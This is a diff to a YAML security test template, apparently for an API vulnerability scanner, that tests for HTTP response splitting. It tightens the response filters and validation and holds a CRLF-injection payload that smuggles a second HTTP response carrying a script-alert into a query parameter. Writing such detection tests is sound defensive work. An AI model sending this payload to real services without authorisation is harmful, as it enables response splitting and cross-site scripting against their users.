@@ -32,6 +32,8 @@ api_selection_filters:
   method:
     neq: "OPTIONS"
   response_payload:
+    length:
+      gt: 0
     not_contains:
       - Error
       - Internal Server 
@@ -66,13 +68,19 @@ api_selection_filters:
         extract: query_key
       value:
         extract: query_value
+  response_headers:
+    for_one:
+      key:
+        eq: "content-type"
+      value:
+        eq: "application/json"
 
 execute:
   type: single
   requests:
     - req:
         - modify_query_param:
-            query_key: ${query_value}%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
+            query_key: ${query_value}%0d%0acontent-length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0acontent-type:%20text/html%0d%0acontent-length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
 
 validate:
   response_code:
@@ -109,3 +117,9 @@ validate:
       - account is locked
       - account is blocked
       - multiple failed attempts
+  response_headers:
+    for_one:
+      key:
+        eq: content-type
+      value:
+        contains_either: "text/html"
